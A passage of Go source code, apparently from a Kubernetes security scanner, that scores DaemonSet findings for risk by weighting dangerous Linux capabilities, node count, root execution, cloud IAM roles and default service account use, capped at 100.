	// Dangerous capabilities - cluster-wide impact
	dangerousCaps := map[string]int{
		"SYS_ADMIN":       70, // Full system administration on all nodes
		"SYS_MODULE":      65, // Kernel module loading on all nodes
		"SYS_PTRACE":      55, // Process debugging/injection on all nodes
		"SYS_RAWIO":       55, // Direct hardware access on all nodes
		"DAC_READ_SEARCH": 45, // Bypass file read permissions on all nodes
		"DAC_OVERRIDE":    40, // Bypass file write permissions on all nodes
		"NET_ADMIN":       40, // Network configuration on all nodes
		"SYS_BOOT":        50, // System reboot capability on all nodes
		"SYS_TIME":        35, // System time manipulation on all nodes
	}

	for _, cap := range finding.Capabilities {
		for dangerousCap, capScore := range dangerousCaps {
			if strings.Contains(cap, dangerousCap) {
				score += capScore
			}
		}
	}

	// Number of nodes affected - wider deployment = higher risk
	// DaemonSets affect ALL scheduled nodes, so this is a multiplier
	if finding.DesiredNodes > 100 {
		score += 30 // Large cluster-wide deployment
	} else if finding.DesiredNodes > 50 {
		score += 25 // Medium cluster-wide deployment
	} else if finding.DesiredNodes > 20 {
		score += 20 // Moderate cluster-wide deployment
	} else if finding.DesiredNodes > 5 {
		score += 15 // Small cluster-wide deployment
	} else if finding.DesiredNodes > 0 {
		score += 10 // Minimal deployment
	}

	// RunAsUser check - root on all nodes
	if finding.RunAsUser == "0" || finding.RunAsUser == "" || finding.RunAsUser == "<NONE>" {
		score += 20 // Running as root on all nodes
	}

	// Cloud IAM role - potential cloud access from all nodes
	if finding.CloudRole != "" {
		if strings.Contains(strings.ToLower(finding.CloudRole), "admin") {
			score += 50 // Admin role on all nodes
		} else {
			score += 30 // Any cloud role on all nodes
		}
	}

	// Service account risk
	if finding.ServiceAccount == "default" {
		score += 10 // Using default SA on all nodes
	}

	// Cap at 100
	if score > 100 {
		score = 100
	}

	return score
}
